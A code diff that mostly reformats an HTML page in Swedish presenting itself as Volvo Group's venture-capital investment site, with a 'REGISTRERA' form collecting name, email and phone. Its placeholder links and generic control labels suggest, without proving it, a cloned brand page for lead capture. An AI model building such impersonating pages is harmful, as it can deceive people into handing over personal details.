@@ -287,10 +287,9 @@
       <section class="mx-auto mb-24 sm:mb-24" id="about">
        <div class="w-full flex justify-center items-center sm:flex-col">
         <div class="relative pr-2 w-2/3 flex sm:pr-0 sm:w-full sm:mr-0 js-vid1 sm:mb-12 sm:block">
-            <video allowfullscreen="" autoplay="" class="block object-fill w-full rounded-custom overflow-hidden" controls="controls" id="video_main" muted="" src="media/00.mp4">
-                <track kind="captions" src="/" srclang="en" label="English">
-            </video>
-            
+         <video allowfullscreen="" autoplay="" class="block object-fill w-full rounded-custom overflow-hidden" controls="controls" id="video_main" muted="" src="media/00.mp4">
+          <track kind="captions" label="English" src="/" srclang="en"/>
+         </video>
          <div class="play-btn">
          </div>
         </div>
@@ -1172,9 +1171,9 @@
          <div class="aem-GridColumn aem-GridColumn--phone--12 aem-GridColumn--tablet--6 aem-GridColumn--default--6">
           <div class="text section">
            <div class="text__container" data-nc="Text">
-            <h4 style="text-align: left;">
+            <h3 style="text-align: left;">
              Vår historia
-            </h4>
+            </h3>
             <p style="text-align: left;">
              Med oss som investerare kommer entreprenörer och startups att få tillgång till unika fördelar som toppledningens uppmärksamhet i en global ledande OEM, expertis från 100 000 anställda, en multibillion-dollar leveranskedja och globala kunder och leverantörer att samarbeta med. Vi är snabba, enkla att arbeta med och sätter våra startups i första hand. Som en integrerad del av Volvo Group har vi 25 års erfarenhet av strategiska investeringar och skapar värde både för våra startups, för Volvo Group och för transportsektorn.
              <br/>
@@ -1209,9 +1208,9 @@
          <div class="aem-GridColumn aem-GridColumn--phone--12 aem-GridColumn--tablet--6 aem-GridColumn--default--6">
           <div class="text section">
            <div class="text__container" data-nc="Text">
-            <h4 style="text-align: left;">
+            <h3 style="text-align: left;">
              Vårt team
-            </h4>
+            </h3>
             <p>
              Vi är ett mångsidigt, erfaret team med globala perspektiv och räckvidd. Flera av våra investerare har varit inom riskkapital i mer än 20 år. Vi har kontor i Göteborg, Greensboro och Silicon Valley. Vi samarbetar nära med våra nätverk över hela Europa, Nordamerika och Israel..
             </p>
@@ -1828,598 +1827,600 @@
        </span>
        <form action="" autocomplete="on" class="form-container" id="main_form">
         <input aria-label="Interactive Element" name="task" tabindex="0" type="hidden" value="process"/>
-        <input aria-label="Interactive Element" name="country" tabindex="0" type="hidden" value="se">
-         <div class="form_group--name">
-          <input aria-label="Interactive Element" autocomplete="on" class="input-form-reg-up" name="name" placeholder="Namn:" required="" tabindex="0"/>
+        <input aria-label="Interactive Element" name="country" tabindex="0" type="hidden" value="se"/>
+        <div class="form_group--name">
+         <input aria-label="Interactive Element" autocomplete="on" class="input-form-reg-up" name="name" placeholder="Namn:" required="" tabindex="0">
           <div class="help-block help-block-error">
           </div>
+         </input>
+        </div>
+        <div class="form_group--name">
+         <input aria-label="Interactive Element" autocomplete="on" class="input-form-reg-up" name="lastname" placeholder="Efternamn:" required="" tabindex="0" value=""/>
+         <div class="help-block help-block-error">
          </div>
-         <div class="form_group--name">
-          <input aria-label="Interactive Element" autocomplete="on" class="input-form-reg-up" name="lastname" placeholder="Efternamn:" required="" tabindex="0" value=""/>
-          <div class="help-block help-block-error">
-          </div>
+        </div>
+        <div class="form_group--email">
+         <label for="email1" style="display: none;">
+          Label for input
+         </label>
+         <input aria-label="Interactive Element" autocomplete="on" class="input-form-reg-up" id="email1" name="email" placeholder="E-post:" required="" tabindex="0" type="email"/>
+         <center>
+          <span class="error" id="email_result">
+          </span>
+         </center>
+         <div class="help-block help-block-error">
          </div>
-         <div class="form_group--email">
-          <label for="email1"  style="display: none;">
-           Label for input
-          </label>
-          <input aria-label="Interactive Element" autocomplete="on" class="input-form-reg-up" id="email1" name="email" placeholder="E-post:" required="" tabindex="0" type="email"/>
-          <center>
-           <span class="error" id="email_result">
-           </span>
-          </center>
-          <div class="help-block help-block-error">
-          </div>
-         </div>
-         <div class="form_input--group">
-          <input aria-label="Interactive Element" class="phone input-form-reg-num-up" name="phone" placeholder=" 406 12 345" required="" style="padding-left: 85px" tabindex="0" type="tel"/>
-         </div>
-         <div class="form_group--button">
-          <button aria-label="Interactive Element" class="send-form btn btn-primary" id="buttonSend1" tabindex="0" type="submit">
-           <span class="button--inner" style="text-transform: uppercase;">
-            REGISTRERA
-           </span>
-          </button>
-         </div>
-         <input aria-label="Interactive Element" class="phonecc" name="phonecc" tabindex="0" type="hidden" value=""/>
-         <input aria-label="Interactive Element" name="country" tabindex="0" type="hidden" value="se"/>
-        </input>
+        </div>
+        <div class="form_input--group">
+         <input aria-label="Interactive Element" class="phone input-form-reg-num-up" name="phone" placeholder=" 406 12 345" required="" style="padding-left: 85px" tabindex="0" type="tel"/>
+        </div>
+        <div class="form_group--button">
+         <button aria-label="Interactive Element" class="send-form btn btn-primary" id="buttonSend1" tabindex="0" type="submit">
+          <span class="button--inner" style="text-transform: uppercase;">
+           REGISTRERA
+          </span>
+         </button>
+        </div>
+        <input aria-label="Interactive Element" class="phonecc" name="phonecc" tabindex="0" type="hidden" value=""/>
+        <input aria-label="Interactive Element" name="country" tabindex="0" type="hidden" value="se"/>
        </form>
       </div>
      </div>
     </div>
    </div>
   </div>
-  <footer class="footer__container">
-   <div class="container">
-    <div class="footer__links">
+ </body>
+</html>
+<footer class="footer__container">
+ <div class="container">
+  <div class="footer__links">
+  </div>
+ </div>
+ <div class="footer__bottom">
+  <div class="container">
+   <div class="footer__copyright">
+    <p class="footer__copyrightText">
+     Copyright AB Volvo 2023
+    </p>
+    <div class="list">
+     <p class="cmp-list__title">
+      Copyright AB Volvo
+     </p>
+     <ul class="cmp-list">
+      <li class="cmp-list__item">
+       <a aria-label="Interactive Element" class="cmp-list__item-link cmp-list__item-link--noicon" data-link-text="www.volvogroup.com" href="#about" tabindex="0" target="_self">
+        www.volvogroup.com
+       </a>
+      </li>
+      <li class="cmp-list__item">
+       <a aria-label="Interactive Element" class="cmp-list__item-link cmp-list__item-link--noicon" data-link-text="Contact us" href="#about" tabindex="0" target="_self">
+        Kontakta oss
+       </a>
+      </li>
+      <li class="cmp-list__item">
+       <a aria-label="Interactive Element" class="cmp-list__item-link cmp-list__item-link--noicon" data-link-text="Cookies" href="#about" tabindex="0" target="_self">
+        Cookies
+       </a>
+      </li>
+      <li class="cmp-list__item">
+       <a aria-label="Interactive Element" class="cmp-list__item-link cmp-list__item-link--noicon" data-link-text="Privacy" href="#about" tabindex="0" target="_self">
+        Privacy
+       </a>
+      </li>
+     </ul>
     </div>
    </div>
-   <div class="footer__bottom">
-    <div class="container">
-     <div class="footer__copyright">
-      <p class="footer__copyrightText">
-       Copyright AB Volvo 2023
-      </p>
-      <div class="list">
-       <p class="cmp-list__title">
-        Copyright AB Volvo
-       </p>
-       <ul class="cmp-list">
-        <li class="cmp-list__item">
-         <a aria-label="Interactive Element" class="cmp-list__item-link cmp-list__item-link--noicon" data-link-text="www.volvogroup.com" href="#about" tabindex="0" target="_self">
-          www.volvogroup.com
-         </a>
-        </li>
-        <li class="cmp-list__item">
-         <a aria-label="Interactive Element" class="cmp-list__item-link cmp-list__item-link--noicon" data-link-text="Contact us" href="#about" tabindex="0" target="_self">
-          Kontakta oss
-         </a>
-        </li>
-        <li class="cmp-list__item">
-         <a aria-label="Interactive Element" class="cmp-list__item-link cmp-list__item-link--noicon" data-link-text="Cookies" href="#about" tabindex="0" target="_self">
-          Cookies
-         </a>
-        </li>
-        <li class="cmp-list__item">
-         <a aria-label="Interactive Element" class="cmp-list__item-link cmp-list__item-link--noicon" data-link-text="Privacy" href="#about" tabindex="0" target="_self">
-          Privacy
-         </a>
-        </li>
-       </ul>
-      </div>
-     </div>
-    </div>
-   </div>
-  </footer>
-  <link href="css/cookienote.lc-20230921094509-lc.css" media="all" rel="stylesheet"/>
-  <style type="text/css">
-   aside.cookienote__container {
+  </div>
+ </div>
+</footer>
+<link href="css/cookienote.lc-20230921094509-lc.css" media="all" rel="stylesheet"/>
+<style type="text/css">
+ aside.cookienote__container {
             visibility: hidden;
         }
 
         .cookie-notification {
             visibility: hidden;
         }
-  </style>
-  <div id="onetrust-consent-sdk">
-   <div class="onetrust-pc-dark-filter ot-fade-in" style="display: none;transition: visibility 0s 400ms, opacity 400ms linear;
+</style>
+<div id="onetrust-consent-sdk">
+ <div class="onetrust-pc-dark-filter ot-fade-in" style="display: none;transition: visibility 0s 400ms, opacity 400ms linear;
                     opacity: 0;visibility: hidden;z-index:2147483645;">
-   </div>
-   <div class="otCenterRounded default ot-wo-title vertical-align-content" id="onetrust-banner-sdk" style="display: none;
+ </div>
+ <div class="otCenterRounded default ot-wo-title vertical-align-content" id="onetrust-banner-sdk" style="display: none;
                     transition: visibility 0s 400ms, opacity 400ms linear;
                     opacity: 0;visibility: hidden;" tabindex="0">
-    <div aria-describedby="onetrust-policy-text" aria-label="Privacy" class="ot-sdk-container" role="alertdialog">
-     <div class="ot-sdk-row">
-      <div class="ot-sdk-twelve ot-sdk-columns" id="onetrust-group-container">
-       <div id="onetrust-policy">
-        <div class="banner-header">
-         <div class="banner_logo">
-         </div>
-        </div>
-        <p id="onetrust-policy-text">
-         We and our digital partners use cookies to improve your
+  <div aria-describedby="onetrust-policy-text" aria-label="Privacy" class="ot-sdk-container" role="alertdialog">
+   <div class="ot-sdk-row">
+    <div class="ot-sdk-twelve ot-sdk-columns" id="onetrust-group-container">
+     <div id="onetrust-policy">
+      <div class="banner-header">
+       <div class="banner_logo">
+       </div>
+      </div>
+      <p id="onetrust-policy-text">
+       We and our digital partners use cookies to improve your
                                 browsing experience, save your preferences and provide us with information on how you
                                 use our website.
-         <br/>
-         <br/>
-         You can click on ”Accept All Cookies” and agree to the storing of cookies on your device
+       <br/>
+       <br/>
+       You can click on ”Accept All Cookies” and agree to the storing of cookies on your device
                                 and to our use of cookies. You can also configure or reject cookies by clicking on”
                                 Cookie Settings” or "Reject All". Please note that selecting "Reject All" still implies
                                 that necessary cookies will remain.
-         <br/>
-         <br/>
-         Please note that you can navigate to our Cookie Preference center at any time by
+       <br/>
+       <br/>
+       Please note that you can navigate to our Cookie Preference center at any time by
                                 clicking the shield icon displayed at the bottom left on each page.
-         <br/>
-         <br/>
-         For more information about cookies, please see our
-         <a aria-label="Interactive Element" href="#about" tabindex="0">
-          Cookie Notice
-         </a>
-        </p>
-       </div>
-      </div>
-      <div class="ot-sdk-twelve ot-sdk-columns has-reject-all-button" id="onetrust-button-group-parent">
-       <div id="onetrust-button-group">
-        <div class="banner-actions-container">
-         <button aria-label="Interactive Element" id="onetrust-reject-all-handler" tabindex="0">
-          Reject
-                                    All
-         </button>
-         <button aria-label="Interactive Element" id="onetrust-accept-btn-handler" tabindex="0">
-          Accept All Cookies
-         </button>
-        </div>
-        <button aria-label="Interactive Element" id="onetrust-pc-btn-handler" tabindex="0">
-         Cookies Settings
-        </button>
-       </div>
-      </div>
-      <div id="onetrust-close-btn-container">
-      </div>
+       <br/>
+       <br/>
+       For more information about cookies, please see our
+       <a aria-label="Interactive Element" href="#about" tabindex="0">
+        Cookie Notice
+       </a>
+      </p>
      </div>
+    </div>
+    <div class="ot-sdk-twelve ot-sdk-columns has-reject-all-button" id="onetrust-button-group-parent">
+     <div id="onetrust-button-group">
+      <div class="banner-actions-container">
+       <button aria-label="Interactive Element" id="onetrust-reject-all-handler" tabindex="0">
+        Reject
+                                    All
+       </button>
+       <button aria-label="Interactive Element" id="onetrust-accept-btn-handler" tabindex="0">
+        Accept All Cookies
+       </button>
+      </div>
+      <button aria-label="Interactive Element" id="onetrust-pc-btn-handler" tabindex="0">
+       Cookies Settings
+      </button>
+     </div>
+    </div>
+    <div id="onetrust-close-btn-container">
     </div>
    </div>
-   <div aria-describedby="ot-pc-desc" aria-label="Privacy Preference Center" aria-modal="true" class="otPcCenter ot-hide ot-fade-in" id="onetrust-pc-sdk" lang="en" role="alertdialog" style="display: none;
+  </div>
+ </div>
+ <div aria-describedby="ot-pc-desc" aria-label="Privacy Preference Center" aria-modal="true" class="otPcCenter ot-hide ot-fade-in" id="onetrust-pc-sdk" lang="en" role="alertdialog" style="display: none;
                     transition: visibility 0s 400ms, opacity 400ms linear;
                     opacity: 0;visibility: hidden;">
-    <div class="ot-pc-header">
-     <div aria-label="Company Logo" background-position:="" bb4bf5e0-f419-4c25-b6cf-6bc2d1dc2366="" c2b0daa2-27eb-46f0-8226-2ea8fc787c9d="" cdn.cookielaw.org="" class="ot-pc-logo" d33ef4e1-8264-42a4-9218-da59e8571d81="" https:="" left;"="" logos="" role="img" style="background-image: url(" volvo_word_mark_spread_liten_.png");="">
-     </div>
-     <button aria-label="Close" class="ot-close-icon" id="close-pc-btn-handler" tabindex="0">
-     </button>
-    </div>
-    <div class="ot-pc-scrollbar" id="ot-pc-content">
-     <h2 id="ot-pc-title">
-      Privacy Preference Center
-     </h2>
-     <div id="ot-pc-desc">
-      When you visit any website, it may store or retrieve information on your browser,
+  <div class="ot-pc-header">
+   <div aria-label="Company Logo" background-position:="" bb4bf5e0-f419-4c25-b6cf-6bc2d1dc2366="" c2b0daa2-27eb-46f0-8226-2ea8fc787c9d="" cdn.cookielaw.org="" class="ot-pc-logo" d33ef4e1-8264-42a4-9218-da59e8571d81="" https:="" left;"="" logos="" role="img" style="background-image: url(" volvo_word_mark_spread_liten_.png");="">
+   </div>
+   <button aria-label="Close" class="ot-close-icon" id="close-pc-btn-handler" tabindex="0">
+   </button>
+  </div>
+  <div class="ot-pc-scrollbar" id="ot-pc-content">
+   <h2 id="ot-pc-title">
+    Privacy Preference Center
+   </h2>
+   <div id="ot-pc-desc">
+    When you visit any website, it may store or retrieve information on your browser,
                     mostly in the form of cookies. This information might be about you, your preferences or your device
                     and is mostly used to make the site work as you expect it to. The information does not usually
                     directly identify you, but it can give you a more personalized web experience. Because we respect
                     your right to privacy, you can choose not to allow some types of cookies. Click on the different
                     category headings to find out more and change our default settings. However, blocking some types of
                     cookies may impact your experience of the site and the services we are able to offer.
-     </div>
-     <button aria-label="Interactive Element" id="accept-recommended-btn-handler" tabindex="0">
-      Allow All
+   </div>
+   <button aria-label="Interactive Element" id="accept-recommended-btn-handler" tabindex="0">
+    Allow All
+   </button>
+   <section class="ot-sdk-row ot-cat-grp">
+    <h3 id="ot-category-title">
+     Manage Consent Preferences
+    </h3>
+    <div class="ot-accordion-layout ot-cat-item" data-optanongroupid="C0001">
+     <button aria-controls="ot-desc-id-C0001" aria-expanded="false" aria-label="Interactive Element" aria-labelledby="ot-header-id-C0001" ot-accordion="true" tabindex="0">
      </button>
-     <section class="ot-sdk-row ot-cat-grp">
-      <h3 id="ot-category-title">
-       Manage Consent Preferences
-      </h3>
-      <div class="ot-accordion-layout ot-cat-item" data-optanongroupid="C0001">
-       <button aria-controls="ot-desc-id-C0001" aria-expanded="false" aria-label="Interactive Element" aria-labelledby="ot-header-id-C0001" ot-accordion="true" tabindex="0">
-       </button>
-       <div class="ot-acc-hdr ot-always-active-group">
-        <div class="ot-plus-minus">
-         <span>
-         </span>
-         <span>
-         </span>
-        </div>
-        <h4 class="ot-cat-header" id="ot-header-id-C0001">
-         Strictly Necessary Cookies
-        </h4>
-        <div class="ot-always-active">
-         Always Active
-        </div>
-       </div>
-       <div class="ot-acc-grpcntr ot-acc-txt">
-        <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0001">
-         These cookies are necessary
+     <div class="ot-acc-hdr ot-always-active-group">
+      <div class="ot-plus-minus">
+       <span>
+       </span>
+       <span>
+       </span>
+      </div>
+      <h4 class="ot-cat-header" id="ot-header-id-C0001">
+       Strictly Necessary Cookies
+      </h4>
+      <div class="ot-always-active">
+       Always Active
+      </div>
+     </div>
+     <div class="ot-acc-grpcntr ot-acc-txt">
+      <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0001">
+       These cookies are necessary
                                 for the website to function and cannot be switched off in our systems. They are usually
                                 only set in response to actions made by you which amount to a request for services, such
                                 as setting your privacy preferences, logging in or filling in forms. You can set your
                                 browser to block or alert you about these cookies, but some parts of the site will not
                                 then work. These cookies do not store any personally identifiable information.
-        </p>
-        <div class="ot-hlst-cntr">
-         <button aria-label="Cookie Details button opens Cookie List menu" class="ot-link-btn category-host-list-handler" data-parent-id="C0001" tabindex="0">
-          Cookies Details‎
-         </button>
-        </div>
-       </div>
-      </div>
-      <div class="ot-accordion-layout ot-cat-item" data-optanongroupid="C0002">
-       <button aria-controls="ot-desc-id-C0002" aria-expanded="false" aria-label="Interactive Element" aria-labelledby="ot-header-id-C0002" ot-accordion="true" tabindex="0">
+      </p>
+      <div class="ot-hlst-cntr">
+       <button aria-label="Cookie Details button opens Cookie List menu" class="ot-link-btn category-host-list-handler" data-parent-id="C0001" tabindex="0">
+        Cookies Details‎
        </button>
-       <div class="ot-acc-hdr">
-        <div class="ot-plus-minus">
-         <span>
-         </span>
-         <span>
-         </span>
-        </div>
-        <h4 class="ot-cat-header" id="ot-header-id-C0002">
+      </div>
+     </div>
+    </div>
+    <div class="ot-accordion-layout ot-cat-item" data-optanongroupid="C0002">
+     <button aria-controls="ot-desc-id-C0002" aria-expanded="false" aria-label="Interactive Element" aria-labelledby="ot-header-id-C0002" ot-accordion="true" tabindex="0">
+     </button>
+     <div class="ot-acc-hdr">
+      <div class="ot-plus-minus">
+       <span>
+       </span>
+       <span>
+       </span>
+      </div>
+      <h4 class="ot-cat-header" id="ot-header-id-C0002">
+       Performance Cookies
+      </h4>
+      <div class="ot-tgl">
+       <input aria-checked="true" aria-label="Interactive Element" aria-labelledby="ot-header-id-C0002" checked="" class="category-switch-handler" data-optanongroupid="C0002" id="ot-group-id-C0002" name="ot-group-id-C0002" role="switch" tabindex="0" type="checkbox"/>
+       <label class="ot-switch" for="ot-group-id-C0002">
+        <span aria-checked="false" class="ot-switch-nob" role="switch">
+        </span>
+        <span class="ot-label-txt">
          Performance Cookies
-        </h4>
-        <div class="ot-tgl">
-         <input aria-checked="true" aria-label="Interactive Element" aria-labelledby="ot-header-id-C0002" checked="" class="category-switch-handler" data-optanongroupid="C0002" id="ot-group-id-C0002" name="ot-group-id-C0002" role="switch" tabindex="0" type="checkbox"/>
-         <label class="ot-switch" for="ot-group-id-C0002">
-          <span aria-checked="false" class="ot-switch-nob" role="switch">
-          </span>
-          <span class="ot-label-txt">
-           Performance Cookies
-          </span>
-         </label>
-        </div>
-       </div>
-       <div class="ot-acc-grpcntr ot-acc-txt">
-        <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0002">
-         These cookies allow us to
+        </span>
+       </label>
+      </div>
+     </div>
+     <div class="ot-acc-grpcntr ot-acc-txt">
+      <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0002">
+       These cookies allow us to
                                 count visits and traffic sources so we can measure and improve the performance of our
                                 site. They help us to know which pages are the most and least popular and see how
                                 visitors move around the site. All information these cookies collect is aggregated and
                                 therefore anonymous. If you do not allow these cookies we will not know when you have
                                 visited our site, and will not be able to monitor its performance.
-        </p>
-        <div class="ot-hlst-cntr">
-         <button aria-label="Cookie Details button opens Cookie List menu" class="ot-link-btn category-host-list-handler" data-parent-id="C0002" tabindex="0">
-          Cookies Details‎
-         </button>
-        </div>
-       </div>
-      </div>
-      <div class="ot-accordion-layout ot-cat-item" data-optanongroupid="C0005">
-       <button aria-controls="ot-desc-id-C0005" aria-expanded="false" aria-label="Interactive Element" aria-labelledby="ot-header-id-C0005" ot-accordion="true" tabindex="0">
+      </p>
+      <div class="ot-hlst-cntr">
+       <button aria-label="Cookie Details button opens Cookie List menu" class="ot-link-btn category-host-list-handler" data-parent-id="C0002" tabindex="0">
+        Cookies Details‎
        </button>
-       <div class="ot-acc-hdr">
-        <div class="ot-plus-minus">
-         <span>
-         </span>
-         <span>
-         </span>
-        </div>
-        <h4 class="ot-cat-header" id="ot-header-id-C0005">
-         Social Media Cookies
-        </h4>
-        <div class="ot-tgl">
-         <input aria-checked="true" aria-label="Interactive Element" aria-labelledby="ot-header-id-C0005" checked="" class="category-switch-handler" data-optanongroupid="C0005" id="ot-group-id-C0005" name="ot-group-id-C0005" role="switch" tabindex="0" type="checkbox"/>
-         <label class="ot-switch" for="ot-group-id-C0005">
-          <span aria-checked="false" class="ot-switch-nob" role="switch">
-          </span>
-          <span class="ot-label-txt">
-           Social
+      </div>
+     </div>
+    </div>
+    <div class="ot-accordion-layout ot-cat-item" data-optanongroupid="C0005">
+     <button aria-controls="ot-desc-id-C0005" aria-expanded="false" aria-label="Interactive Element" aria-labelledby="ot-header-id-C0005" ot-accordion="true" tabindex="0">
+     </button>
+     <div class="ot-acc-hdr">
+      <div class="ot-plus-minus">
+       <span>
+       </span>
+       <span>
+       </span>
+      </div>
+      <h4 class="ot-cat-header" id="ot-header-id-C0005">
+       Social Media Cookies
+      </h4>
+      <div class="ot-tgl">
+       <input aria-checked="true" aria-label="Interactive Element" aria-labelledby="ot-header-id-C0005" checked="" class="category-switch-handler" data-optanongroupid="C0005" id="ot-group-id-C0005" name="ot-group-id-C0005" role="switch" tabindex="0" type="checkbox"/>
+       <label class="ot-switch" for="ot-group-id-C0005">
+        <span aria-checked="false" class="ot-switch-nob" role="switch">
+        </span>
+        <span class="ot-label-txt">
+         Social
                                         Media Cookies
-          </span>
-         </label>
-        </div>
-       </div>
-       <div class="ot-acc-grpcntr ot-acc-txt">
-        <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0005">
-         These cookies are set by a
+        </span>
+       </label>
+      </div>
+     </div>
+     <div class="ot-acc-grpcntr ot-acc-txt">
+      <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0005">
+       These cookies are set by a
                                 range of social media services that we have added to the site to enable you to share our
                                 content with your friends and networks. They are capable of tracking your browser across
                                 other sites and building up a profile of your interests. This may impact the content and
                                 messages you see on other websites you visit. If you do not allow these cookies you may
                                 not be able to use or see these sharing tools.
-        </p>
-        <div class="ot-hlst-cntr">
-         <button aria-label="Cookie Details button opens Cookie List menu" class="ot-link-btn category-host-list-handler" data-parent-id="C0005" tabindex="0">
-          Cookies Details‎
-         </button>
-        </div>
-       </div>
-      </div>
-      <div class="ot-accordion-layout ot-cat-item" data-optanongroupid="C0003">
-       <button aria-controls="ot-desc-id-C0003" aria-expanded="false" aria-label="Interactive Element" aria-labelledby="ot-header-id-C0003" ot-accordion="true" tabindex="0">
+      </p>
+      <div class="ot-hlst-cntr">
+       <button aria-label="Cookie Details button opens Cookie List menu" class="ot-link-btn category-host-list-handler" data-parent-id="C0005" tabindex="0">
+        Cookies Details‎
        </button>
-       <div class="ot-acc-hdr">
-        <div class="ot-plus-minus">
-         <span>
-         </span>
-         <span>
-         </span>
-        </div>
-        <h4 class="ot-cat-header" id="ot-header-id-C0003">
-         Functional Cookies
-        </h4>
-        <div class="ot-tgl">
-         <input aria-checked="true" aria-label="Interactive Element" aria-labelledby="ot-header-id-C0003" checked="" class="category-switch-handler" data-optanongroupid="C0003" id="ot-group-id-C0003" name="ot-group-id-C0003" role="switch" tabindex="0" type="checkbox"/>
-         <label class="ot-switch" for="ot-group-id-C0003">
-          <span aria-checked="false" class="ot-switch-nob" role="switch">
-          </span>
-          <span class="ot-label-txt">
-           Functional
+      </div>
+     </div>
+    </div>
+    <div class="ot-accordion-layout ot-cat-item" data-optanongroupid="C0003">
+     <button aria-controls="ot-desc-id-C0003" aria-expanded="false" aria-label="Interactive Element" aria-labelledby="ot-header-id-C0003" ot-accordion="true" tabindex="0">
+     </button>
+     <div class="ot-acc-hdr">
+      <div class="ot-plus-minus">
+       <span>
+       </span>
+       <span>
+       </span>
+      </div>
+      <h4 class="ot-cat-header" id="ot-header-id-C0003">
+       Functional Cookies
+      </h4>
+      <div class="ot-tgl">
+       <input aria-checked="true" aria-label="Interactive Element" aria-labelledby="ot-header-id-C0003" checked="" class="category-switch-handler" data-optanongroupid="C0003" id="ot-group-id-C0003" name="ot-group-id-C0003" role="switch" tabindex="0" type="checkbox"/>
+       <label class="ot-switch" for="ot-group-id-C0003">
+        <span aria-checked="false" class="ot-switch-nob" role="switch">
+        </span>
+        <span class="ot-label-txt">
+         Functional
                                         Cookies
-          </span>
-         </label>
-        </div>
-       </div>
-       <div class="ot-acc-grpcntr ot-acc-txt">
-        <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0003">
-         These cookies enable the
+        </span>
+       </label>
+      </div>
+     </div>
+     <div class="ot-acc-grpcntr ot-acc-txt">
+      <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0003">
+       These cookies enable the
                                 website to provide enhanced functionality and personalisation. They may be set by us or
                                 by third party providers whose services we have added to our pages. If you do not allow
                                 these cookies then some or all of these services may not function properly.
-        </p>
-        <div class="ot-hlst-cntr">
-         <button aria-label="Cookie Details button opens Cookie List menu" class="ot-link-btn category-host-list-handler" data-parent-id="C0003" tabindex="0">
-          Cookies Details‎
-         </button>
-        </div>
-       </div>
-      </div>
-      <div class="ot-accordion-layout ot-cat-item" data-optanongroupid="C0004">
-       <button aria-controls="ot-desc-id-C0004" aria-expanded="false" aria-label="Interactive Element" aria-labelledby="ot-header-id-C0004" ot-accordion="true" tabindex="0">
+      </p>
+      <div class="ot-hlst-cntr">
+       <button aria-label="Cookie Details button opens Cookie List menu" class="ot-link-btn category-host-list-handler" data-parent-id="C0003" tabindex="0">
+        Cookies Details‎
        </button>
-       <div class="ot-acc-hdr">
-        <div class="ot-plus-minus">
-         <span>
-         </span>
-         <span>
-         </span>
-        </div>
-        <h4 class="ot-cat-header" id="ot-header-id-C0004">
-         Targeting Cookies
-        </h4>
-        <div class="ot-tgl">
-         <input aria-checked="true" aria-label="Interactive Element" aria-labelledby="ot-header-id-C0004" checked="" class="category-switch-handler" data-optanongroupid="C0004" id="ot-group-id-C0004" name="ot-group-id-C0004" role="switch" tabindex="0" type="checkbox"/>
-         <label class="ot-switch" for="ot-group-id-C0004">
-          <span aria-checked="false" class="ot-switch-nob" role="switch">
-          </span>
-          <span class="ot-label-txt">
-           Targeting
+      </div>
+     </div>
+    </div>
+    <div class="ot-accordion-layout ot-cat-item" data-optanongroupid="C0004">
+     <button aria-controls="ot-desc-id-C0004" aria-expanded="false" aria-label="Interactive Element" aria-labelledby="ot-header-id-C0004" ot-accordion="true" tabindex="0">
+     </button>
+     <div class="ot-acc-hdr">
+      <div class="ot-plus-minus">
+       <span>
+       </span>
+       <span>
+       </span>
+      </div>
+      <h4 class="ot-cat-header" id="ot-header-id-C0004">
+       Targeting Cookies
+      </h4>
+      <div class="ot-tgl">
+       <input aria-checked="true" aria-label="Interactive Element" aria-labelledby="ot-header-id-C0004" checked="" class="category-switch-handler" data-optanongroupid="C0004" id="ot-group-id-C0004" name="ot-group-id-C0004" role="switch" tabindex="0" type="checkbox"/>
+       <label class="ot-switch" for="ot-group-id-C0004">
+        <span aria-checked="false" class="ot-switch-nob" role="switch">
+        </span>
+        <span class="ot-label-txt">
+         Targeting
                                         Cookies
-          </span>
-         </label>
-        </div>
-       </div>
-       <div class="ot-acc-grpcntr ot-acc-txt">
-        <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0004">
-         These cookies may be set
+        </span>
+       </label>
+      </div>
+     </div>
+     <div class="ot-acc-grpcntr ot-acc-txt">
+      <p class="ot-acc-grpdesc ot-category-desc" id="ot-desc-id-C0004">
+       These cookies may be set
                                 through our site by our advertising partners. They may be used by those companies to
                                 build a profile of your interests and show you relevant adverts on other sites. They do
                                 not store directly personal information, but are based on uniquely identifying your
                                 browser and internet device. If you do not allow these cookies, you will experience less
                                 targeted advertising.
-        </p>
-        <div class="ot-hlst-cntr">
-         <button aria-label="Cookie Details button opens Cookie List menu" class="ot-link-btn category-host-list-handler" data-parent-id="C0004" tabindex="0">
-          Cookies Details‎
-         </button>
-        </div>
-       </div>
+      </p>
+      <div class="ot-hlst-cntr">
+       <button aria-label="Cookie Details button opens Cookie List menu" class="ot-link-btn category-host-list-handler" data-parent-id="C0004" tabindex="0">
+        Cookies Details‎
+       </button>
       </div>
-     </section>
+     </div>
     </div>
-    <section class="ot-hide ot-hosts-ui ot-pc-scrollbar" id="ot-pc-lst">
-     <div id="ot-pc-hdr">
-      <div id="ot-lst-title">
-       <button aria-label="Back" class="ot-link-btn back-btn-handler" tabindex="0">
-        <svg id="ot-back-arw" viewbox="0 0 444.531 444.531" x="0px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" y="0px">
-         <title>
-          Back Button
-         </title>
-         <g>
-          <path d="M213.13,222.409L351.88,83.653c7.05-7.043,10.567-15.657,10.567-25.841c0-10.183-3.518-18.793-10.567-25.835
+   </section>
+  </div>
+  <section class="ot-hide ot-hosts-ui ot-pc-scrollbar" id="ot-pc-lst">
+   <div id="ot-pc-hdr">
+    <div id="ot-lst-title">
+     <button aria-label="Back" class="ot-link-btn back-btn-handler" tabindex="0">
+      <svg id="ot-back-arw" viewbox="0 0 444.531 444.531" x="0px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" y="0px">
+       <title>
+        Back Button
+       </title>
+       <g>
+        <path d="M213.13,222.409L351.88,83.653c7.05-7.043,10.567-15.657,10.567-25.841c0-10.183-3.518-18.793-10.567-25.835
                     l-21.409-21.416C323.432,3.521,314.817,0,304.637,0s-18.791,3.521-25.841,10.561L92.649,196.425
                     c-7.044,7.043-10.566,15.656-10.566,25.841s3.521,18.791,10.566,25.837l186.146,185.864c7.05,7.043,15.66,10.564,25.841,10.564
                     s18.795-3.521,25.834-10.564l21.409-21.412c7.05-7.039,10.567-15.604,10.567-25.697c0-10.085-3.518-18.746-10.567-25.978
                     L213.13,222.409z" fill="#656565">
-          </path>
-         </g>
-        </svg>
-       </button>
-       <h3>
-        Performance Cookies
-       </h3>
